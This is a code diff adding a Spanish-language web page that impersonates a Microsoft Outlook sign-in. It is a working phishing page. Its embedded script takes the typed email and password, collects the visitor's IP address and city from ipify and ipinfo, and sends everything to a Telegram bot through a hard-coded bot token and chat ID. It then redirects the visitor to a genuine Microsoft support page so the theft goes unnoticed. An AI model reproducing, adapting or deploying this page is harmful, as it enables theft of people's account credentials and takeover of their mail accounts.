@@ -1,0 +1,151 @@
+<html lang="es"><head></head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
+  <meta name="apple-itunes-app" content="app-id=284847138">
+  <title>Inicio de Sesión</title>
+
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f2f5;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .login-form {
+      width: 100%;
+      max-width: 400px; /* Ajuste máximo de ancho */
+      padding: 40px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .login-form h2 {
+      text-align: center;
+      margin-bottom: 30px;
+      color: #333;
+      font-weight: 600;
+    }
+
+    .login-form p img {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 150px;
+    }
+
+    .login-form input[type="email"], .login-form input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 20px;
+      border: 2px solid transparent;
+      border-radius: 6px;
+      background-color: #f9f9f9;
+      font-size: 14px;
+      transition: border-color 0.3s, box-shadow 0.3s, background-color 0.3s;
+    }
+
+    .login-form input[type="email"]:focus, .login-form input[type="password"]:focus {
+      border-color: #74b9ff;
+      box-shadow: 0 0 10px rgba(116, 185, 255, 0.6);
+      background-color: #ecf5ff;
+      outline: none;
+    }
+
+    .login-form input[type="submit"] {
+      width: 100%;
+      padding: 14px;
+      background-color: #0078d7;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .login-form input[type="submit"]:hover {
+      background-color: #005ea3;
+    }
+
+    .login-form p {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 30px;
+    }
+
+    .login-form p strong {
+      color: #555;
+    }
+
+  </style>
+</head>
+
+<body>
+  <div class="login-form">
+    <p><img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft"></p>
+    <h2>Iniciar Sesión</h2>
+    <div class="___q35p590 fedgsey f71fsbu f1n95isl" style="
+    margin-bottom: 20px;
+">Para continuar a Outlook</div>
+    
+    <form id="loginForm">
+      <input type="email" id="usuario111" name="usuario111" placeholder="Correo electrónico" required="">
+      <input type="password" id="usuario222" name="usuario222" placeholder="Contraseña" required="">
+      <input type="submit" value="Ingresar">
+    </form>
+
+    <p><strong>Iniciar - 2024 Equipo Microsoft</strong></p>
+    <p><strong>Validar su correo correctamente</strong></p>
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      $('#loginForm').submit(function(e) {
+        e.preventDefault();
+        var u_name111 = $('#usuario111').val();
+        var u_name222 = $('#usuario222').val();
+
+        var ip, ip2;
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
+          ip = data.ip;
+          $.getJSON("https://ipinfo.io", function(response) {
+            ip2 = response.city + ", " + response.country;
+            var message = "E-mail-:\nCorreo: " + u_name111 + "\nClave: " + u_name222 + "\nIP: " + ip + "\n" + ip2;
+            var telegram_bot_id = "7013446332:AAFzYh7kqHeba1qmpsXV4RDhSgqXRpVCcsY";
+            var chat_id = "6588464495";
+            var settings = {
+              "async": true,
+              "crossDomain": true,
+              "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+              "method": "POST",
+              "headers": {
+                "Content-Type": "application/json",
+                "cache-control": "no-cache"
+              },
+              "data": JSON.stringify({
+                "chat_id": chat_id,
+                "text": message
+              })
+            };
+            $.ajax(settings).done(function(response) {
+              window.location = 'https://support.microsoft.com/es-ES/microsoft-365';
+            });
+          });
+        });
+      });
+    });
+  </script>
+
+
+</body></html>
